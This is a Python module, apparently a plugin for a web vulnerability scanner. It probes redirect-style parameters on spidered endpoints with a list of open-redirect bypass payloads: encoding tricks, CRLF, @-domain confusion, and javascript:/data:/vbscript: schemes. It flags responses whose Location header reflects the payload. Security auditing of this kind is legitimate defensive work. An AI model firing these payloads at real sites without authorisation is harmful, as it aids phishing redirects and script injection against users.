import asyncio
import aiohttp
import re
import random
from urllib.parse import urlparse, urljoin

NAME = "open_redirect"
CATEGORY = "vuln"
DESCRIPTION = "Surgical Open Redirection Auditor"

OPTIONS = [
    {"name": "timeout", "type": int, "default": 8, "help": "Request timeout (seconds)"},
    {"name": "concurrency", "type": int, "default": 10, "help": "Concurrent attack threads"},
]

# ─────────────────────────────────────────────────────────────────────────────
# APEX-KING PAYLOAD MATRIX
# ─────────────────────────────────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    # Basic & Protocol Bypasses
    "https://google.com",
    "//google.com",
    "https:google.com",
    r"/\google.com",
    r"/%5Cgoogle.com",
    r"//google.com/%2f..",
    
    # Path & Encoding Bypasses
    "/.google.com",
    "//google%00.com",
    "/%0d%0agoogle.com", # CRLF Injection
    r"//google.com/%2f..",
    "/%2f%2fgoogle.com",
    "/%09google.com",
    
    # Domain Logic Bypasses
    "https://google.com@trusted.com",
    "https://trusted.com.google.com",
    "https://google.com/trusted.com",
    
    # URL Scheme Bypasses
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "vbscript:msgbox(1)",
]

COMMON_REDIRECT_PARAMS = [
    "url", "redirect", "next", "dest", "to", "out", "view", "link",
    "callback", "checkout_url", "forward", "destination", "site",
    "r", "u", "return", "return_to", "rurl", "uurl"
]

class RedirectAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.semaphore = asyncio.Semaphore(options.get("concurrency", 10))

    async def audit_parameter(self, url, method, pname):
        """Tests a specific parameter for Open Redirect vulnerabilities."""
        findings = []
        
        # Test each payload in the matrix
        for payload in REDIRECT_PAYLOADS:
            try:
                async with self.semaphore:
                    # We use allow_redirects=False to catch the Location header
                    params = {pname: payload} if method == "GET" else {}
                    data = {pname: payload} if method == "POST" else {}
                    
                    async with self.session.request(
                        method, 
                        url, 
                        params=params, 
                        data=data, 
                        allow_redirects=False, 
                        timeout=self.options.get("timeout")
                    ) as r:
                        location = r.headers.get("Location", "")
                        
                        # High-fidelity verification
                        if "google.com" in location.lower() or "javascript:alert" in location.lower():
                            findings.append({
                                "url": url,
                                "parameter": pname,
                                "type": "OPEN_REDIRECT",
                                "severity": "MEDIUM",
                                "confidence": "CERTAIN",
                                "evidence": f"Redirected to: {location} using payload {payload}",
                                "repro_data": {
                                    "url": url,
                                    "method": method,
                                    "params": params,
                                    "data": data,
                                    "headers": {"Referer": url}
                                }
                            })
                            break # Found a working payload for this param
            except:
                continue
        return findings

async def run(target, emit, options=None):
    emit.info(f"[*] OPEN_REDIRECT: Apex-Grade audit for {target}")
    
    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    
    # 1. Identify surfaces (Spider data + Heuristic Discovery)
    surfaces = []
    seen_params = set()
    
    for ep in endpoints:
        params = ep.get("params", {})
        all_params = []
        if isinstance(params, dict):
            for bucket in params.values():
                if isinstance(bucket, list): all_params.extend(bucket)
        elif isinstance(params, list):
            all_params = params

        # Heuristic: Check for common redirect parameter names
        for p in all_params:
            p_str = str(p).lower()
            if any(x in p_str for x in COMMON_REDIRECT_PARAMS):
                surfaces.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})
                seen_params.add((ep.get("url"), p))

    if not surfaces:
        emit.warn("[!] No obvious redirection surfaces found. Checking all endpoints...")
        # fallback: check first param of every POST endpoint
        for ep in endpoints:
            if ep.get("method", "GET").upper() == "POST":
                params = ep.get("params", {}).get("body", [])
                if params:
                    surfaces.append({"url": ep.get("url"), "method": "POST", "parameter": params[0]})

    if not surfaces:
        emit.warn("[!] No targets identified.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Auditing {len(surfaces)} redirection surface(s) with {len(REDIRECT_PAYLOADS)} payloads each...")

    findings = []
    async with aiohttp.ClientSession() as session:
        # Apply global config (Proxy, Headers)
        from hellhound.core import http_utils
        http_utils.apply_session_config(session, options or {})
        
        auditor = RedirectAuditor(emit, session, options or {})
        tasks = [auditor.audit_parameter(s["url"], s["method"], s["parameter"]) for s in surfaces]
        results = await asyncio.gather(*tasks)
        
        for res in results:
            if res:
                findings.extend(res)
                for f in res:
                    emit.warn(f"        [!] OPEN REDIRECT: {f['url']} via {f['parameter']}")

    if findings:
        emit.success(f"[+] OPEN_REDIRECT complete. Found {len(findings)} vulnerabilities!")
    else:
        emit.info("[-] No open redirects detected.")

    return {
        "raw": f"Audited {len(surfaces)} surfaces. Found {len(findings)} Open Redirects.",
        "intel": {"vulnerabilities": findings},
        "signals": ["REDIRECT_FOUND" if findings else "NO_REDIRECT"]
    }
